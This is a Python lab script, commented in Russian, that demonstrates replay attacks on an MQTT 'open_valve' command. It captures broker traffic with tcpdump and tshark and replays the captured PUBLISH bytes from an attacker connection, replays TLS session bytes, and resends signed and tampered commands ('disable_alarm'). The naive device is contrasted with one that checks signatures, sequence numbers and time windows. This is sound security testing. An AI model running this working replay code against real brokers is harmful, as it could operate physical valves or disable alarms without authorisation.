"""Replay-атаки на команду open_valve.

(а) открытый брокер: перехваченные байты PUBLISH повторяются атакующим в новом TCP-соединении;
(б) TLS: перехваченные байты клиента TLS-сессии повторяются в новом TCP-соединении к :8883;
(в) прикладной повтор через законную учётную запись (скомпрометированный сервис/инсайдер): та же
    подписанная команда отправляется ещё раз. «Наивное» устройство dev-001 выполняет всё подряд;
    защищённое dev-002 проверяет подпись ECDSA, монотонный seq и окно времени ±30 с.
    python tools/replay.py      → results/replay.json
"""

import json
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec

sys.path.insert(0, str(Path(__file__).parent))
from sec import BROKER, WEAK, connect_packet, connect_wait, mqtt5  # noqa: E402

import paho.mqtt.client as mqtt  # noqa: E402

KEYS = Path("/lab/ota/keys")
V2 = mqtt.CallbackAPIVersion.VERSION2
RESULT, LOG = [], []
EXEC: dict[str, list] = {"weak-dev-001": [], "dev-001": [], "dev-002": []}


def sh(cmd: str) -> str:
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()


def check(name, expect, fact, ok) -> None:
    RESULT.append({"check": name, "expected": expect, "actual": fact, "pass": ok})
    print(f"  [{'OK' if ok else 'FAIL'}] {name}: ожидалось «{expect}» → {fact}", flush=True)


class Protected:
    """Проверка команды: подпись сервиса → seq строго растёт → метка времени в окне ±30 с."""

    def __init__(self):
        self.pub = serialization.load_pem_public_key((KEYS / "cmd_signing.pub").read_bytes())
        self.last_seq = 0

    def accept(self, payload: bytes) -> tuple[bool, str]:
        m = json.loads(payload)
        body = json.dumps(m["body"], separators=(",", ":"), sort_keys=True).encode()
        try:
            self.pub.verify(bytes.fromhex(m["sig"]), body, ec.ECDSA(hashes.SHA256()))
        except (InvalidSignature, ValueError):
            return False, "подпись неверна"
        b = m["body"]
        if b["seq"] <= self.last_seq:
            return False, f"seq {b['seq']} ≤ последнего принятого {self.last_seq} — повтор"
        if abs(time.time() - b["ts"]) > 30:
            return False, "метка времени вне окна ±30 с"
        self.last_seq = b["seq"]
        return True, "выполнено"


def signed(cmd: str, dev: str, seq: int) -> bytes:
    key = serialization.load_pem_private_key((KEYS / "cmd_signing.key").read_bytes(), None)
    body = {"cmd": cmd, "dev": dev, "seq": seq, "ts": time.time()}
    raw = json.dumps(body, separators=(",", ":"), sort_keys=True).encode()
    return json.dumps({"body": body, "sig": key.sign(raw, ec.ECDSA(hashes.SHA256())).hex()}).encode()


def devices() -> list:
    prot = Protected()
    w = mqtt.Client(V2, client_id="dev-001", protocol=mqtt.MQTTv5)
    w.on_message = lambda _c, _u, m: EXEC["weak-dev-001"].append(m.payload.decode())
    connect_wait(w, WEAK, 1883)
    w.subscribe("site/dev-001/cmd", qos=1)
    n = mqtt5("dev-001", "dev-001")
    n.on_message = lambda _c, _u, m: EXEC["dev-001"].append(m.payload.decode())
    connect_wait(n, BROKER, 8883)
    n.subscribe("site/dev-001/cmd", qos=1)
    p = mqtt5("dev-002", "dev-002")

    def on_prot(_c, _u, m):
        ok, why = prot.accept(m.payload)
        LOG.append({"t": time.time(), "accepted": ok, "reason": why})
        if ok:
            EXEC["dev-002"].append(m.payload.decode())
    p.on_message = on_prot
    connect_wait(p, BROKER, 8883)
    p.subscribe("site/dev-002/cmd", qos=1)
    time.sleep(1)
    return [w, n, p]


def capture(port: int, action) -> str:
    pcap = f"/tmp/replay_{port}.pcap"
    td = subprocess.Popen(["tcpdump", "-i", "eth0", "-w", pcap, "-U", f"tcp port {port}"], stderr=subprocess.DEVNULL)
    time.sleep(1.2)
    action()
    time.sleep(1.2)
    td.terminate()
    td.wait()
    return pcap


def raw_send(host: str, port: int, chunks: list[bytes], pause: float = 0.05) -> str:
    s = socket.create_connection((host, port), timeout=3)
    got = b""
    try:
        for c in chunks:
            s.sendall(c)
            time.sleep(pause)
        s.settimeout(1.5)
        while True:
            d = s.recv(4096)
            if not d:
                break
            got += d
    except OSError as e:
        return f"{len(got)} Б ответа, затем {type(e).__name__}"
    finally:
        s.close()
    return f"{len(got)} Б ответа, соединение закрыто брокером"


def main() -> None:
    sys.stdout.reconfigure(encoding="utf-8", line_buffering=True)
    if not (KEYS / "cmd_signing.key").exists():
        sh(f"openssl ecparam -name prime256v1 -genkey -noout -out {KEYS}/cmd_signing.key && "
           f"chmod 600 {KEYS}/cmd_signing.key && openssl ec -in {KEYS}/cmd_signing.key -pubout -out {KEYS}/cmd_signing.pub")
    clients = devices()
    print("8. Replay-атаки")

    # (а) открытый брокер
    def legit_plain():
        c = mqtt.Client(V2, client_id="svc-plain", protocol=mqtt.MQTTv5)
        connect_wait(c, WEAK, 1883)
        c.publish("site/dev-001/cmd", '{"cmd":"open_valve","id":"A1"}', qos=1).wait_for_publish(3)
        c.disconnect()
        c.loop_stop()
    pcap = capture(1883, legit_plain)
    hexp = sh(f"tshark -r {pcap} -Y 'mqtt.msgtype==3 && frame contains \"open_valve\"' -T fields -e tcp.payload 2>/dev/null").split()[0]
    before = len(EXEC["weak-dev-001"])
    resp = raw_send(WEAK, 1883, [connect_packet("attacker"), bytes.fromhex(hexp)])
    time.sleep(1)
    check("(а) открытый брокер: повтор перехваченного PUBLISH", "команда выполнена повторно (атака удалась)",
          f"выполнений: {before} → {len(EXEC['weak-dev-001'])}; брокер: {resp}", len(EXEC["weak-dev-001"]) == before + 1)

    # (б) TLS: повтор байтов TLS-сессии
    def legit_tls():
        c = mqtt5("svc-ingest", "svc-ingest-tls")
        connect_wait(c, BROKER, 8883)
        c.publish("site/dev-001/cmd", '{"cmd":"open_valve","id":"B1"}', qos=1).wait_for_publish(3)
        time.sleep(0.3)
        c.disconnect()
        c.loop_stop()
    before = len(EXEC["dev-001"])
    pcap = capture(8883, legit_tls)
    time.sleep(0.5)
    after_legit = len(EXEC["dev-001"])
    rows = sh(f"tshark -r {pcap} -Y 'tcp.dstport==8883 && tcp.len>0' -T fields -e tcp.stream -e tcp.payload 2>/dev/null").splitlines()
    stream0 = rows[0].split("\t")[0]
    chunks = [bytes.fromhex(r.split("\t")[1]) for r in rows if r.split("\t")[0] == stream0]
    resp = raw_send(BROKER, 8883, chunks)
    time.sleep(1)
    check("(б) TLS: повтор перехваченных байтов сессии", "отказ: новые ключи сессии, записи не расшифровываются",
          f"легитимная команда выполнена ({before} → {after_legit}), повтор {len(chunks)} записей: {resp}; "
          f"выполнений после повтора {len(EXEC['dev-001'])}", len(EXEC["dev-001"]) == after_legit)

    # (в) прикладной повтор через законную учётную запись
    svc = mqtt5("svc-ingest", "svc-ingest-app")
    connect_wait(svc, BROKER, 8883)
    n0, p0 = len(EXEC["dev-001"]), len(EXEC["dev-002"])
    m1, m2 = signed("open_valve", "dev-001", 7), signed("open_valve", "dev-002", 7)
    for _ in range(3):                                   # исходная команда + 2 повтора тех же байтов
        svc.publish("site/dev-001/cmd", m1, qos=1)
        svc.publish("site/dev-002/cmd", m2, qos=1)
        time.sleep(0.5)
    tampered = json.loads(signed("open_valve", "dev-002", 8))
    tampered["body"]["cmd"] = "disable_alarm"            # содержимое изменено, подпись старая
    svc.publish("site/dev-002/cmd", json.dumps(tampered), qos=1)
    old = json.loads(m2)
    time.sleep(1.5)
    check("(в) наивное устройство: та же команда 3 раза", "выполнена 3 раза (атака удалась)",
          f"выполнений: {len(EXEC['dev-001']) - n0}", len(EXEC["dev-001"]) - n0 == 3)
    reasons = [x["reason"] for x in LOG]
    check("(в) защищённое устройство: подпись + seq + окно времени", "выполнена 1 раз, 2 повтора и подделка отклонены",
          f"выполнений: {len(EXEC['dev-002']) - p0}; решения: {reasons}",
          len(EXEC["dev-002"]) - p0 == 1 and reasons.count("подпись неверна") == 1 and sum("повтор" in r for r in reasons) == 2)
    for c in clients + [svc]:
        c.disconnect()
        c.loop_stop()
    Path("/lab/results/replay.json").write_text(json.dumps({"checks": RESULT, "protected_log": LOG,
                                                            "signed_example": old}, ensure_ascii=False, indent=1),
                                                encoding="utf-8")


if __name__ == "__main__":
    main()
